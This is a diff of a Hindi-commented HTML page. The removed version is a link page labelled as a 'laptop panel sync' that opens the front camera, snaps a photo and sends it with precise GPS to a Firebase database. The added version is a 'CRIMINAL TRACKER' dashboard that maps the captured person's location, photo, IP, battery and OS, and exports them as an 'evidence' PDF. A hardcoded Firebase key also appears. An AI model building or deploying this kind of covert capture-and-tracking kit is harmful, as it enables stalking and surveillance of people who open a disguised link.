@@ -1,104 +1,135 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS - CORE NO-STORAGE LINK</title>
+    <title>JARVIS V9.5 - CRIMINAL TRACKER</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
     <style>
-        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
-        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
-        .btn:active { background: #00a8ff; transform: scale(0.98); }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; line-height: 1.5; }
-        #v { width: 100%; height: auto; display: none; }
-        canvas { display: none; }
+        body { margin: 0; background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; display: flex; height: 100vh; overflow: hidden; }
+        #side-panel { width: 380px; background: #0a0a0a; border-right: 3px solid #00f2ff; padding: 20px; z-index: 100; flex-shrink: 0; overflow-y: auto; box-shadow: 10px 0 20px rgba(0,242,255,0.2); }
+        #map { flex-grow: 1; transition: filter 0.5s; background: #111; position: relative; }
+        
+        /* स्कैनिंग इफेक्ट */
+        .photo-box { width: 280px; height: 280px; border: 4px solid #00f2ff; margin: 0 auto 15px auto; position: relative; background: #000; box-shadow: 0 0 15px #00f2ff; overflow: hidden; }
+        .photo-box img { width: 100%; height: 100%; object-fit: cover; }
+        .scanner-line { width: 100%; height: 3px; background: #ff0000; position: absolute; top: 0; left: 0; z-index: 10; box-shadow: 0 0 10px #ff0000; animation: scan 2s linear infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        /* टारगेट तीर और लिफ्ट एनीमेशन */
+        .arrow-marker {
+            width: 0; height: 0;
+            border-left: 15px solid transparent; border-right: 15px solid transparent;
+            border-bottom: 30px solid #ff0000;
+            filter: drop-shadow(0 0 10px #ff0000);
+            animation: lift-up 1.5s infinite ease-in-out;
+        }
+        @keyframes lift-up {
+            0%, 100% { transform: translateY(0px) scale(1); }
+            50% { transform: translateY(-20px) scale(1.2); }
+        }
+
+        .target-circle { width: 50px; height: 50px; border: 2px solid #ff0000; border-radius: 50%; position: absolute; top: -10px; left: -10px; animation: pulse-ring 1.5s infinite; }
+        @keyframes pulse-ring { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(2); opacity: 0; } }
+
+        .label { color: #00f2ff; font-size: 11px; text-transform: uppercase; font-weight: bold; display: block; margin-top: 10px; letter-spacing: 1px;}
+        .value { color: #fff; font-size: 14px; display: block; margin-bottom: 8px; font-weight: bold; text-shadow: 0 0 5px #00f2ff;}
+        #pdf-btn { width: 100%; padding: 15px; background: #ff0000; color: #fff; border: none; font-weight: bold; cursor: pointer; margin-top: 15px; text-transform: uppercase; box-shadow: 0 0 15px #ff0000; transition: 0.3s; }
+        #pdf-btn:hover { background: #b30000; }
+        
+        .vision-btn { flex: 1; padding: 10px; border: 2px solid #00f2ff; background: transparent; color: #00f2ff; cursor: pointer; font-weight: bold; font-size: 10px; transition: 0.3s; }
+        .active-vision { background: #00f2ff; color: #000; }
     </style>
 </head>
-<body>
-
-    <div class="control-box">
-        <h2>JARVIS SYSTEM V2</h2>
-        <p style="color: #888; font-size: 13px;">डायरेक्ट डेटाबेस सिंक मोड (नो-स्टोरेज)</p>
+<body id="report-content">
+    <div id="side-panel">
+        <h2 style="text-align:center; letter-spacing: 3px; color: #ff0000; text-shadow: 0 0 10px #ff0000;">TARGET LOCKED</h2>
         
-        <video id="v" autoplay playsinline muted></video>
-        <canvas id="c"></canvas>
-
-        <button class="btn" onclick="syncDeviceData()">🚀 लैपटॉप पैनल सिंक करें</button>
-        
-        <div class="status-text" id="log-status">
-            <b>सिस्टम स्थिति:</b> रेडी (डेटा भेजने के लिए बटन दबाएं)
+        <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+            <button class="vision-btn" onclick="setVision('night')" id="n-btn">Night Vision</button>
+            <button class="vision-btn active-vision" onclick="setVision('day')" id="d-btn">Day Vision</button>
         </div>
+
+        <div class="photo-box">
+            <div class="scanner-line"></div>
+            <img id="d-photo" src="https://via.placeholder.com/280?text=SCANNING+TARGET">
+        </div>
+
+        <span class="label">📍 CRIMINAL LOCATION</span>
+        <span id="d-addr" class="value" style="font-size:12px; color:#ff4d4d; border-left: 2px solid #ff4d4d; padding-left: 5px;">Awaiting Signal...</span>
+
+        <div style="border-top:1px solid #333; margin-top:15px; padding-top:10px; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 5px;">
+            <span class="label">📱 DEVICE INTEL</span>
+            <span class="label">OS: <span id="d-os" style="color:#fff;">--</span></span>
+            <span class="label">BATTERY: <span id="d-bat" style="color:#fff;">--%</span></span>
+            <span class="label">IP ADDRESS: <span id="d-ip" style="color:#fff;">0.0.0.0</span></span>
+        </div>
+
+        <button id="pdf-btn" onclick="generatePDF()">📥 EXPORT EVIDENCE (PDF)</button>
     </div>
 
-    <script>
-        const firebaseConfig = {
-          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
-          authDomain: "army-cb492.firebaseapp.com",
-          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
-          projectId: "army-cb492",
-          storageBucket: "army-cb492.firebasestorage.app",
-          messagingSenderId: "449848409517",
-          appId: "1:449848409517:web:386ad1b570731b6ec4f524",
-          measurementId: "G-NVG20J32ZP"
-        };
+    <div id="map"></div>
 
-        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    <script>
+        const firebaseConfig = { databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        async function syncDeviceData() {
-            const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> कैमरा और GPS चालू किया जा रहा है...";
+        var map = L.map('map', { zoomControl: false }).setView([20, 78], 5);
+        L.tileLayer('http://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}',{ maxZoom: 20, subdomains:['mt0','mt1','mt2','mt3'] }).addTo(map);
 
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+        var currentMarker, currentCircle;
 
-                video.onloadedmetadata = () => {
-                    captureAndSync(stream, statusDiv);
-                };
+        function setVision(v) {
+            const m = document.getElementById('map');
+            document.getElementById('n-btn').classList.toggle('active-vision', v==='night');
+            document.getElementById('d-btn').classList.toggle('active-vision', v==='day');
+            m.style.filter = (v === 'night') ? "invert(100%) hue-rotate(180deg) brightness(95%) sepia(100%) saturate(200%) hue-rotate(80deg)" : "none";
+        }
 
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    statusDiv.innerHTML += `<br>📍 GPS लॉक: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
-                }, (err) => {
-                    statusDiv.innerHTML += "<br>❌ GPS एरर: लोकेशन परमिशन दें।";
-                }, { enableHighAccuracy: true });
+        function generatePDF() {
+            const element = document.getElementById('report-content');
+            html2pdf().from(element).save('Evidence_Report.pdf');
+        }
 
-            } catch (err) {
-                statusDiv.innerHTML = "❌ एरर: कैमरा अनुमति प्रदान करें।";
+        database.ref('live_detect').on('value', s => {
+            const d = s.val(); if(!d) return;
+
+            // डेटा अपडेट होने पर अलर्ट साउंड (वैकल्पिक)
+            // new Audio('https://www.soundjay.com/buttons/beep-01a.mp3').play();
+
+            if(d.photo) document.getElementById('d-photo').src = d.photo;
+            if(d.intel) {
+                document.getElementById('d-ip').innerText = d.intel.ip || "Unknown";
+                document.getElementById('d-bat').innerText = d.intel.battery || "0%";
+                document.getElementById('d-os').innerText = d.intel.ua ? (d.intel.ua.platform || "Android/iOS") : "Mobile";
             }
-        }
 
-        function captureAndSync(stream, statusDiv) {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            
-            setTimeout(() => {
-                c.width = 320; // साइज थोड़ा छोटा रखा है ताकि डेटाबेस में फास्ट लोड हो
-                c.height = 240;
-                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
+            if(d.location) {
+                const lat = d.location.lat, lon = d.location.lon;
                 
-                // इमेज को बेस64 टेक्स्ट में बदलना
-                const base64Photo = c.toDataURL('image/jpeg', 0.6);
+                if (currentMarker) map.removeLayer(currentMarker);
+                if (currentCircle) map.removeLayer(currentCircle);
                 
-                statusDiv.innerHTML += "<br>📤 डेटाबेस में डायरेक्ट सिंक जारी...";
-                
-                // सीधे रियल-टाइम डेटाबेस में भेजना
-                database.ref('live_detect').update({ photo: base64Photo })
-                .then(() => {
-                    statusDiv.innerHTML += "<br>✅ [SUCCESS] लैपटॉप पैनल पर फोटो जा चुकी है!";
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(e => {
-                    statusDiv.innerHTML += "<br>❌ डेटाबेस एरर: रूल्स चेक करें।";
+                var arrowIcon = L.divIcon({
+                    className: 'custom-div-icon',
+                    html: `<div class="target-circle"></div><div class="arrow-marker"></div>`,
+                    iconSize: [30, 42],
+                    iconAnchor: [15, 42]
                 });
-            }, 800);
-        }
+
+                // डेंजर ज़ोन सर्कल
+                currentCircle = L.circle([lat, lon], { color: 'red', fillColor: '#f03', fillOpacity: 0.2, radius: 100 }).addTo(map);
+                currentMarker = L.marker([lat, lon], { icon: arrowIcon }).addTo(map);
+                
+                map.flyTo([lat, lon], 18, { animate: true, duration: 1.5 });
+
+                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                .then(r=>r.json()).then(res=> document.getElementById('d-addr').innerText = res.display_name );
+            }
+        });
     </script>
 </body>
 </html>
